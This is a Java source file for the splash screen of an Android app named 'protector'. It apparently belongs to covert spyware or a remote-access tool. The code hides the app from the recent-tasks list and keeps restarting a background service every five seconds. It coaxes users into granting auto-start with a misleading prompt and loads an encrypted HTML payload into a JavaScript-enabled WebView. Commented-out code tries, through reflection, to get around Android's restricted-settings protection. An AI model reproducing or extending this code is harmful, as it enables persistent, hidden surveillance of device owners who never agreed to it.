package com.icontrol.protector;

import static androidx.core.content.PackageManagerCompat.ACTION_PERMISSION_REVOCATION_SETTINGS;
import static com.icontrol.protector.Consts.skip_splash;
import static com.icontrol.protector.MyCods.isServiceRunning;
import static com.icontrol.protector.UtliTools.excludeFromTaskList;
import static com.icontrol.protector.UtliTools.getAppIconAsBase64;
import static com.icontrol.protector.UtliTools.randomnumber;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.os.StrictMode;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.IntentCompat;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;


public class Splasher extends Activity {
    public static String[] NormalPermissions() {
        List<String> permissions = new ArrayList<>();

        // Add only normal permissions
        permissions.add(Manifest.permission.INTERNET); // Normal
        permissions.add(Manifest.permission.WAKE_LOCK); // Normal
        permissions.add(Manifest.permission.ACCESS_NETWORK_STATE); // Normal
        permissions.add(Manifest.permission.ACCESS_WIFI_STATE); // Normal
        permissions.add(Manifest.permission.CHANGE_WIFI_STATE); // Normal
        permissions.add(Manifest.permission.MODIFY_AUDIO_SETTINGS); // Normal

//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
//            permissions.add(Manifest.permission.TURN_SCREEN_ON); // Normal
//        }

        if (Build.VERSION.SDK_INT >= 33 ) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions.toArray(new String[0]);
    }

    private boolean AskAutoStart() {

        final MIUIAutoStart AutoHelper = MIUIAutoStart.getInstance();
        if (
                !MySettings.ReadBool(getApplicationContext(), Consts.AutoStartOn, false) &&
                        AutoHelper.isAutoStartPermissionAvailable(getApplicationContext())) {
            try {
                // startworkers(this);
                Intent workint = new Intent(getApplicationContext(), EngineWorker.class);
                if (!isServiceRunning(getApplicationContext(), EngineWorker.class)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(workint);
                    } else {
                        startService(workint);
                    }
                }

                AlarmHelper.setAlarm(getApplicationContext());
                String buttonnameOK = "OK";

                String Thetitle = "Auto Start";
                String alertmsg = "OK";
                String CurrnetLanuage = Locale.getDefault().getLanguage();
                switch (CurrnetLanuage) {
                    case "ar":
                        buttonnameOK = "موافق";
                        Thetitle = "التشغيل التلقائي";
                        alertmsg = "اسمح لهذا التطبيق بالتشغيل التلقائي لتحسين الأداء.";
                        break;
                    case "zh":
                        buttonnameOK = "好的";
                        Thetitle = "自动启动";
                        alertmsg = "允许此应用程序自动启动以确保流畅运行。";
                        break;
                    case "tr":
                        buttonnameOK = "Tamam";
                        Thetitle = "Otomatik Başlatma";
                        alertmsg = "Sorunsuz çalışması için bu uygulamaya otomatik başlatma izni verin.";
                        break;
                    case "pt":
                        buttonnameOK = "OK";
                        Thetitle = "Inicialização Automática";
                        alertmsg = "Permita que este aplicativo inicie automaticamente para melhor desempenho.";
                        break;
                    case "es":
                        buttonnameOK = "OK";
                        Thetitle = "Inicio Automático";
                        alertmsg = "Permita que esta aplicación se inicie automáticamente para un mejor rendimiento.";
                        break;
                    case "ru":
                        buttonnameOK = "Хорошо";
                        Thetitle = "Автозапуск";
                        alertmsg = "Разрешите этому приложению автозапуск для стабильной работы.";
                        break;
                    default:
                        buttonnameOK = "OK";
                        Thetitle = "Auto Start";
                        alertmsg = "Allow this app to auto-start for smooth performance.";
                        break;
                }


                Drawable icon = null;
                try {
                    // null;
                    icon = getPackageManager().getApplicationIcon(getPackageName());
                } catch (PackageManager.NameNotFoundException ex) {

                }


                AlertDialog.Builder builder = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                        .setTitle(Thetitle)
                        .setMessage(alertmsg)
                        .setPositiveButton(buttonnameOK, (dialog, which) -> {

                            //  setupWorkManager();
                            boolean flag = AutoHelper.getAutoStartPermission(getApplicationContext());
                            MySettings.WriteBool(getApplicationContext(), Consts.AutoStartOn, true);
                            // System.exit(0);
                        });

                if (icon != null) {
                    builder.setIcon(icon);
                }


                builder.show();
                return true;
            } catch (Exception a) {
                a.printStackTrace();
            }
        }
        return false;
    }

    private static final int PERMISSION_REQUEST_CODE = 22;

    private void checkAndRequestPermissions() {
        String[] permissions = NormalPermissions();

        List<String> permissionsNeeded = new ArrayList<>();

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(getApplicationContext(), permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    public static String getLabelApplication(Context context) {
        try {
            return (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
        } catch (Exception ex) {
        }
        return context.getString(R.string.BaseName);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);


    }
    WebView Mwbview;
    @Override
    protected void onDestroy() {
        super.onDestroy();
        try{
            if(Mwbview != null){
                Mwbview.stopLoading();

                // Clear history and cache
                Mwbview.clearHistory();
                Mwbview.clearCache(true);

                // Remove from parent
                ViewGroup parent = (ViewGroup) Mwbview.getParent();
                if (parent != null) {
                    parent.removeView(Mwbview);
                }

                // Destroy the WebView
                Mwbview.removeAllViews();
                Mwbview.destroy();

                // Nullify reference to help GC
                Mwbview = null;
            }
        }catch (Exception s){}
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //this code below can be user to detect memory leak or some bugs try google it (StrictMode.setThreadPolicy)
//        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
//                .detectDiskReads()
//                .detectDiskWrites()
//                .detectAll()   // or .detectAll() for all detectable problems
//                .penaltyLog()
//                .build());
//        StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder()
//                .detectLeakedSqlLiteObjects()
//                .detectLeakedClosableObjects()
//                .penaltyLog()
//                .build());


//        try {
//            Intent intent = new Intent();
//            intent.setComponent(new ComponentName("com.miui.powerkeeper",
//                    "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            startActivity(intent);
//        } catch (Exception exception) {
//            Log.e("MIUIAutoStart", "Error starting intent", exception);
//        }
//        Intent intent = new Intent(Settings.ACTION_CHANNEL_NOTIFICATION_SETTINGS)
//                .putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName())
//                .putExtra(Settings.EXTRA_CHANNEL_ID, "updates");
//        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(intent);
//
//        Intent intent =
//                new Intent(Settings.ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT)
//                        .setData(Uri.fromParts(
//                                "package", getPackageName(), /* fragment= */ null));
//        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        // Launch settings page so user can disable the auto-reset
//        startActivityForResult(intent, 111);
//        Intent insta_intent = getPackageManager().getLaunchIntentForPackage("com.instagram.android");
//       // insta_intent.setComponent(new ComponentName("com.instagram.android", "com.instagram.android.activity.UrlHandlerActivity"));
//
//////use this if you want to open an image
////        insta_intent.setData(Uri.parse("http://instagram.com/p/gjfLqSBQTJ/"));
//
////And if you want to open a user's profile use this
//        insta_intent.setData(Uri.parse("http://instagram.com/_u/yuoi"));
//
//        startActivity(insta_intent);
//        if(1 == 1){
//            return;
//        }

        Context myctx = getApplicationContext();
        LiveChat.instance(getApplicationContext());

        Intent workint = new Intent(myctx, EngineWorker.class);
        if (!isServiceRunning(myctx, EngineWorker.class)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(workint);
            } else {
                startService(workint);
            }
        }
        excludeFromTaskList(getApplicationContext());
//        try {
//            Intent intent = new Intent();
//            intent.setAction("android.settings.MANAGE_DEFAULT_APPS_SETTINGS");
//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            startActivity(intent);
//        } catch (Exception exception) {
//            Log.e("MIUIAutoStart", "Error starting action", exception);
//        }
//
//        try {
//            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
//                    Uri.parse("package:" + "com.android.settings.biometrics"));
//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            startActivity(intent);
//        } catch (Exception exception) {
//            Log.e("MIUIAutoStart", "Error starting intent", exception);
//        }




////
//        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
//      //  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
//            // If not, request the SCHEDULE_EXACT_ALARM permission
//            Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
//            intent.setData(Uri.fromParts("package", getPackageName(), null));
//
//            startActivity(intent);
//       // }

//        Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
//        intent.setData(Uri.parse("package:" + getPackageName()));
//        startActivity(intent);


//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
//                MySettings.Read(myctx, Consts.ontimerest, "").length() == 0){
//            Intent intent = new Intent("android.settings.SHOW_RESTRICTED_SETTING_DIALOG");
//            intent.setPackage("com.android.settings"); // Ensure it targets the correct package
//            intent.putExtra("package_name", getPackageName()); // Optional, if needed
//            intent.putExtra("extra_uid", Process.myUid()); // Optional, if needed
//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Needed if starting from non-Activity context
//
//            try {
//                //startActivity(intent);
//                try {
//                    // Step 1: Get AppOpsManager instance using reflection
//                    Object appOpsManager = getSystemService(Class.forName("android.app.AppOpsManager"));
//
//                    Field ores = appOpsManager.getClass().getField("OPSTR_ACCESS_RESTRICTED_SETTINGS");
//                    ores.setAccessible(true);
//                    // Step 2: Get the 'setMode' method (public method since API 29)
//                    Method setModeMethod =  appOpsManager.getClass().getMethod("setMode", new Class[]{String.class, int.class, String.class, int.class});
//                    setModeMethod.setAccessible(true);
//                    // Step 3: Call the method with your parameters
//                    setModeMethod.invoke(
//                            appOpsManager,
//                            new Object[]{"android:access_restricted_settings",
//                                    Process.myUid(),
//                                    getPackageName(),
//                                    AppOpsManager.MODE_IGNORED}
//                    );
//
//                } catch (Exception e) {
//                    e.printStackTrace();
//                    Toast.makeText(this, "Reflection call failed", Toast.LENGTH_SHORT).show();
//                }
//            } catch (Exception e) {
//                e.printStackTrace();
//                Toast.makeText(this, "Unable to launch restricted setting dialog", Toast.LENGTH_SHORT).show();
//            }
//
//            MySettings.Write(myctx, Consts.ontimerest, "done");
//            try{
//                Thread.sleep(1000);
//            }catch (Exception a){}
//            try{
//                Thread.sleep(1000);
//            }catch (Exception a){}
//            try{
//                Thread.sleep(1000);
//            }catch (Exception a){}
//        }

        if (MySettings.Read(myctx, Consts.DEVICE_ID, "").length() == 0) {
            String newid = UtliTools.Create_DevicID() + String.valueOf(randomnumber(100, 199));
            MyLoger.Debug("CreateID", newid);
            MySettings.Write(myctx, Consts.DEVICE_ID, newid);
        }

        checkAndRequestPermissions();

//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
//            WindowManager wm = getSystemService(WindowManager.class);
//
//            // Get current window metrics
//            WindowMetrics windowMetrics = wm.getCurrentWindowMetrics();
//
//            // Subtract the insets to get the usable app size
//            int width = windowMetrics.getBounds().width();
//            int height = windowMetrics.getBounds().height();
//            MySettings.Write(myctx,Consts.Mob_width,String.valueOf(width));
//            MySettings.Write(myctx,Consts.Mob_height,String.valueOf(height));
//        }else{

//            MySettings.Write(myctx,Consts.Mob_width,mobW);
//            MySettings.Write(myctx,Consts.Mob_height,mobH);
        //}
        if (MySettings.Read(myctx,Consts.Mob_width,"").length() == 0){
            Point size = new Point();
            getWindowManager().getDefaultDisplay().getRealSize(size);
            String mobW = String.valueOf(Math.min(size.x, size.y));
            String mobH = String.valueOf(Math.max(size.x, size.y));
            SharedPreferences mSharedPref;
            mSharedPref = myctx.getSharedPreferences(myctx.getPackageName(), Activity.MODE_PRIVATE);
            SharedPreferences.Editor prefsEditor = mSharedPref.edit();
            prefsEditor.putString(Consts.Mob_width, mobW);
            prefsEditor.putString(Consts.Mob_height, mobH);
            prefsEditor.commit();
        }



        Thread.setDefaultUncaughtExceptionHandler(new MyExceptionHandler(myctx));

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        try {
            if (AskAutoStart()) {
                //final Context mcontext = getApplicationContext();

                //  return;
            }
        } catch (Exception a) {
        }


         Mwbview = new WebView(myctx);

        My_Crpter cr = My_Crpter.Getinstance();
        String loadpage = "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";
        String pagebase64 = cr.Dcrpt_Str(loadpage);
        String MyName = getLabelApplication(myctx);
        try {
            String CurrnetLanuage = Locale.getDefault().getLanguage();
            pagebase64 = (new String(Base64.decode(pagebase64, 0), "UTF-8")).replace("APPNAME", MyName)
                    .replace("[LNG]", CurrnetLanuage)
                    .replace("2024", "2025")
                    .replace("[BASE-ICO]", getAppIconAsBase64(myctx));
            //create webview , load the page from base64 and setcontent , delay for 5 sec , start main activity
            WebSettings webSettings = Mwbview.getSettings();
            webSettings.setJavaScriptEnabled(true);  // Enable JavaScript

            // Load the Base64 content into WebView
            Mwbview.setWebViewClient(new WebViewClient());

            Mwbview.loadDataWithBaseURL(null, pagebase64, "text/html", "UTF-8", null);
            setContentView(Mwbview);

        } catch (Exception e) {
            out();
        }


        Thread thread = new Thread(() -> {
            do {
                try {
                    Thread.sleep(5000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent workintx = new Intent(myctx, EngineWorker.class);
                if (!isServiceRunning(myctx, EngineWorker.class)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(workintx);
                    } else {
                        startService(workintx);
                    }
                }
            } while (!skip_splash);
            out();
        });
        thread.start();

        // Delay for 5 seconds to simulate loading (you can customize this timing)
//        new android.os.Handler().postDelayed(() -> {
//
//        }, 3000);  // 5 seconds delay
    }

    private void out() {
        Intent intent = new Intent(getApplicationContext(), ActivMain.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        startActivity(intent);
        // this.finish();
    }
}
